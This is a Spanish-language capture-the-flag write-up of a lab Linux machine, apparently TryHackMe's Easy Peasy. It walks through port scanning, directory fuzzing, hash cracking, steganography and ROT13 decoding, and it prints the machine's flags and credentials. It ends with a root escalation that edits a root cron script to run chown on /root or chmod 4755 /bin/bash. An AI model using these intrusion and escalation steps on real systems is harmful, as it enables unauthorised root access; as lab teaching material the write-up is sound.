
---

#### Reconocimiento y Enumeración 


- Maquina *Linux*

- Escaneo de Todos los puertos

```java
PORT     STATE SERVICE REASON
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 61
6498/tcp  open  unknown syn-ack ttl 61
65524/tcp open  unknown syn-ack ttl 6
```

- Escaneo de scripts de reconocimiento y versiones

```java
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
|_http-title: Apache2 Debian Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Script de Vulnerabilidades

```java
nmap -p80,6498,65524 --script "vuln" 10.201.32.209
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-28 17:03 -05
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.201.32.209
Host is up (0.24s latency).

PORT      STATE SERVICE
80/tcp    open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /robots.txt: Robots file
|_  /hidden/: Potentially interesting folder
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.securityfocus.com/bid/49303
|       https://www.tenable.com/plugins/nessus/55976
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      https://seclists.org/fulldisclosure/2011/Aug/175
6498/tcp  open  unknown
65524/tcp open  unknown

```


---
#### Fuzzing

- Hacemos fuzzing a los 2 puertos http encontrados los cuales son el *80* y el *65524*

```bash
gobuster dir -u http://10.201.32.209 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x txt,php,html,py,xml
gobuster dir -u http://10.201.32.209:65524 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x txt,php,html,py,xml
```

- Encontramos los siguientes archivos y la primera flag en el fuzzing del puerto *65524*

![[Pasted image 20251028170635.png]]

- Crackeamos el hash con hashes.com y nos muestra una flag
	![[Pasted image 20251028171121.png]]

- A su vez en el puerto 80 encontramos los siguiente directorios 

![[Pasted image 20251028172037.png]]

![[Pasted image 20251028172050.png]]

- En donde en el codigo fuente de whatever nos aparece otra flag la cual con base 64 la decodificamos 

![[Pasted image 20251028172127.png]]

![[Pasted image 20251028172135.png]]

- Vemos las inconsistencias de la pagina de apache de la siguiente forma:

![[Pasted image 20251028180057.png]]

- Encontramos un hash y la flag 3 

![[Pasted image 20251028180146.png]]

![[Pasted image 20251028180218.png]]

- Rompemos el hash de base pero no sabemos que base es entonces vamos a la pagina de cipher detector y encontramos que el hash esta cifrado en base 62 y nos aparece lo siguiente 

![[Pasted image 20251028180641.png]]


- Vamos a la ruta por el puerto *65524* y encontramos el siguiente hash que nos dicen que tenemos que decifrar con el diccionario que ellos nos proporcionaron 
![[Pasted image 20251028180825.png]]

- Podemos descifrar este hash usando un diccionario propio de la siguiente manera con [[john]]

```bash
john --wordlist=/home/xrl3y/TryHackMe/Easy-Peasy/content/easypeasy.txt --format=gost hash
```

- Nos da la siguiente contraseña : *mypasswordforthatjob*

- Ademas en el codigo fuente de la imagen hay una ruta hacia: http://10.201.32.209:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg en donde aplicaremos la extracción de información oculta de imagenes de la siguiente forma:

```bash
wget http://10.201.32.209:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
steghide --extract -sf binarycodepixabay.jpg     # Comando de extraccion de informacion de imagenes

# Nos pedira una contraseña que es la que habiamos obtenido antes y ademas nos dara un fichero txt
```

![[Pasted image 20251028184836.png]]

- Desciframos la contraseña con binario y nos da que el usuario es *boring* y la contraseña es *iconvertedmypasswordtobinary* asi que entramos por ssh

- Una vez adentro tenemos la flag del usuario *synt{a0jvgf33zfa0ez4y}* peor dice que esta rotada asi que la arreglamos:

```bash
echo 'synt{a0jvgf33zfa0ez4y}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'   # Tiene un ROT13 asi que con este comando lo aplicamos

# Flag : flag{n0wits33msn0rm4l}
```

---
#### Escalada de privilegios 

- Estando en el usuario buscamos por sudoers, suid, .ssh y al final lo unico que encontramos es un fichero editado en el etc/crontab

```bash
cat /etc/crontab           # Vemos que hay un archivo ejecutandose con permisos de root
cd var/www                 # Entramos al directorio del permiso
ls -la
nano .mysecretcronjob.sh   # Editamos el archivo bash para que cuando se ejecute nos cumpla el comando que queramos
			chown -R boring:boring /root # Hacemos que boring sea el dueño y del grupo de /root asi cuando se ejecute tendremos los permisos del folder y acceos completo a la flag
			
			# chmod 4755 /bin/bash # Tambien podemos colocar esto para que nuestra bash tenga permisos suid de root y una vez se hallan dado los permisos hacer un /usr/bin/bash -p y ya seriamos automaticamente root
			
bash .mysecretcronjob.sh   # Podemos ejecutarlo sin emargo la tarea cron ya lo deberia hacer automaticamnete 
			

```





